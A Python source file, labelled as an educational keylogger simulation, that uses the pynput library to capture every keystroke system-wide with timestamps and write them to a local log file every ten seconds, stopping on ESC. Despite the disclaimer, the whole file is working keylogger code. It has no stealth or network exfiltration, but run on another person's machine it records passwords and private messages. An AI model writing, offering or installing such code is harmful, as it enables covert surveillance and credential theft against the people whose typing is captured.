#!/usr/bin/env python3
"""
Keylogger Simulation - Educational Purpose Only
"""
import threading
import time
from datetime import datetime
from pynput import keyboard
import os

class KeyLogger:
    def __init__(self, log_file="keystrokes.log"):
        self.log_file = log_file
        self.buffer = []
        self.running = False
        self.listener = None
        
        # Ensure log directory exists
        os.makedirs(os.path.dirname(log_file) if os.path.dirname(log_file) else '.', exist_ok=True)
        
    def start(self):
        """Start the keylogger"""
        self.running = True
        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.start()
        threading.Thread(target=self._auto_flush, daemon=True).start()
        print("✅ Keylogger started. Press ESC to stop.")
        
    def _on_press(self, key):
        """Handle key press"""
        if not self.running:
            return False
            
        try:
            if hasattr(key, 'char') and key.char is not None:
                keystroke = key.char
            else:
                keystroke = f'[{key.name.upper()}]'
                
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.buffer.append(f"{timestamp} | {keystroke}")
            
        except Exception as e:
            self.buffer.append(f"[ERROR] {str(e)}")
            
    def _on_release(self, key):
        """Stop on ESC"""
        if key == keyboard.Key.esc:
            self.running = False
            self.flush()
            return False
            
    def _auto_flush(self):
        """Auto flush every 10 seconds"""
        while self.running:
            time.sleep(10)
            self.flush()
            
    def flush(self):
        """Write buffer to file"""
        if not self.buffer:
            return
        with open(self.log_file, "a") as f:
            f.write("\n".join(self.buffer) + "\n")
        self.buffer.clear()
        
    def stop(self):
        """Stop keylogger"""
        self.running = False
        if self.listener:
            self.listener.stop()
        self.flush()
        print(" Keylogger stopped. Logs saved to", self.log_file)

if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()
    try:
        input()  # Wait
    except KeyboardInterrupt:
        logger.stop()
